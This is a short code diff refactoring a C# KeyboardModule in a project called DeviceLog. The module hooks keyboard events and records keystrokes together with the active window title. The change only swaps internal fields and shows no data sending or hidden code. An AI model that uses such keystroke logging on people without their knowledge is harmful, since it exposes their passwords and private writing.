@@ -1,5 +1,4 @@
 ﻿using DeviceLog.Classes.Log;
-using DeviceLog.Classes.Modules.Window;
 
 namespace DeviceLog.Classes.Modules.Keyboard
 {
@@ -28,11 +27,7 @@ namespace DeviceLog.Classes.Modules.Keyboard
         /// <summary>
         /// The WindowModule that can retrieve the title of the active window
         /// </summary>
-        private readonly WindowModule _windowModule;
-        /// <summary>
-        /// The global LogController that holds a repository of logs
-        /// </summary>
-        private readonly LogController _logController;
+        private readonly WindowHook _windowModule;
 
         /// <summary>
         /// Initialize a new KeyboardModule
@@ -47,8 +42,7 @@ namespace DeviceLog.Classes.Modules.Keyboard
         {
             _keyboardHook = new KeyboardHook(special, control);
             _log = new KeyboardLog();
-            _windowModule = new WindowModule();
-            _logController = logController;
+            _windowModule = new WindowHook();
 
             _currentWindowTitle = "";
             _windowTitle = windowTitle;
@@ -63,7 +57,7 @@ namespace DeviceLog.Classes.Modules.Keyboard
                 _keyboardHook.KeyDown += KeyPress;
             }
 
-            _logController.AddLog(_log);
+            logController.AddLog(_log);
         }
 
         /// <summary>
